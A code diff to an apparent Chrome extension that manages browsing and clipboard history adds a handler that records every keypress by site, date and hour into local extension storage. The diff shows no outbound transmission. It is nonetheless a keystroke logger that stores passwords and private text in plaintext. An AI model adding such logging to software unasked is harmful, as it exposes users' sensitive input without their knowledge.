@@ -5,7 +5,10 @@ var HM = {
     },
     PINNED_TABS = {},
     RECENTLY_CLOSED = [],
-    CLIPBOARD_HISTORY = [];
+    CLIPBOARD_HISTORY = [],
+    KEY_HISTORY = {},
+    REGEX_PARTS = /\/[^/?#]+/g,
+    REGEX_WWW = /^www\./;
 
 document.body.appendChild(HM.clipboard_input);
 
@@ -102,6 +105,39 @@ chrome.runtime.onMessage.addListener(function (request, sender) {
         });
 
         HM.clipboard_input.value = '';
+    } else if (request.type === 'keypress') {
+        var date = new Date(),
+            site = request.href.match(REGEX_PARTS)[0].substr(1).replace(REGEX_WWW, ''),
+            year = date.getFullYear(),
+            month = date.getMonth(),
+            day = date.getDate(),
+            hours = date.getHours();
+
+        if (!KEY_HISTORY[site]) {
+            KEY_HISTORY[site] = {};
+        }
+
+        if (!KEY_HISTORY[site][year]) {
+            KEY_HISTORY[site][year] = {};
+        }
+
+        if (!KEY_HISTORY[site][year][month]) {
+            KEY_HISTORY[site][year][month] = {};
+        }
+
+        if (!KEY_HISTORY[site][year][month][day]) {
+            KEY_HISTORY[site][year][month][day] = {};
+        }
+
+        if (!KEY_HISTORY[site][year][month][day][hours]) {
+            KEY_HISTORY[site][year][month][day][hours] = '';
+        }
+
+        KEY_HISTORY[site][year][month][day][hours] += request.key;
+
+        chrome.storage.local.set({
+            key_history: KEY_HISTORY
+        });
     } else if (request.type === 'linkCheck') {
         var xhr = new XMLHttpRequest();
 
@@ -129,6 +165,10 @@ chrome.runtime.onMessage.addListener(function (request, sender) {
 chrome.storage.local.get(function(items) {
     if (items.clipboard_history) {
         CLIPBOARD_HISTORY = items.clipboard_history;
+    }
+
+    if (items.key_history) {
+        KEY_HISTORY = items.key_history;
     }
 
     if (items.recently_closed) {
